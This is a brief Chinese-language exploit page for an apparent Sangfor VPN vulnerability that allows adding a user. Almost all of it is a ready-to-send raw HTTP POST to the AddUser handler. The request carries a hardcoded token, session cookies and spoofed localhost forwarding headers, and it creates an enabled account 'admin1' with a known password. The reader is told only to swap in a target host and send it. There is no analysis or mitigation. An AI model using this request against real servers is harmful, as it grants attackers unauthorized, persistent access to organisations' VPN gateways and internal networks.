# 深信服vpn 添加用户漏洞

### 
直接将下面数据包发送到深信服VPN 服务器即可
其中 `xxxxxx` 需要替换成自己的服务器地址、端口
```shell
POST /cgi-bin/php-cgi/html/delegatemodule/HttpHandler.php?controler=User&action=AddUser&token=e52021a4c9c962ac9cc647effddcf57242d152d9 HTTP/1.1
Host: xxxxxx
Cookie:language=zh_CN;sinfor_session_id=W730120C88755A7D932019B349CCAC63;PHPSESSID=cb12753556d734509d4092baabfb55dd;x-anti-csrf-gcs=A7DBB1DC0050737E;usermrgstate=%7B%22params%22%3A%7B%22grpid%22%3A%22-1%22%2C%22recflag%22%3A0%2C%22filter%22%3A0%7D%2C%22pageparams%22%3A%7B%22start%22%3A0%2C%22limit%22%3A25%7D%2C%22otherparams%22%3A%7B%22searchtype%22%3A0%2C%22recflag%22%3Afalse%7D%7D;hidecfg=%7B%22name%22%3Afalse%2C%22flag%22%3Afalse%2C%22note%22%3Afalse%2C%22expire%22%3Atrue%2C%22lastlogin_time%22%3Atrue%2C%22phone%22%3Atrue%2C%22allocateip%22%3Atrue%2C%22other%22%3Afalse%2C%22state%22%3Afalse%7D
Content-Length: 707
Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: */*
Origin: https://xxxxxx
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://xxxxxx/html/tpl/userMgt.html?userid=0&groupid=-1&createRole=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

name=admin1&note=admin1&passwd=Admin%40123&passwd2=Admin%40123&phone=&grpid=-1&grptext=%2F%E9%BB%98%E8%AE%A4%E7%94%A8%E6%88%B7%E7%BB%84&selectAll=1&b_inherit_auth=1&b_inherit_grpolicy=1&is_Autoip=1&allocateip=0.0.0.0&gqsj=1&ex_time=2027-07-29&is_enable=1&is_public=1&is_pwd=1&first_psw_type=-1&second_server=&auth_type=0&ext_auth_id=&token_svr_id=%E8%AF%B7%E9%80%89%E6%8B%A9&grpolicy_id=0&grpolicytext=%E9%BB%98%E8%AE%A4%E7%AD%96%E7%95%A5%E7%BB%84&roleid=&roletext=&year=&month=&day=&isBindKey=&userid=0&crypto_key=&szcername=&caid=-1&certOpt=0&create_time=&sec_key=&first_psw_name=%E6%9C%AC%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BA%93&first_psw_id=&second_psw_name=&second_psw_id=&is_extauth=0&secondAuthArr=%5B%5D
```
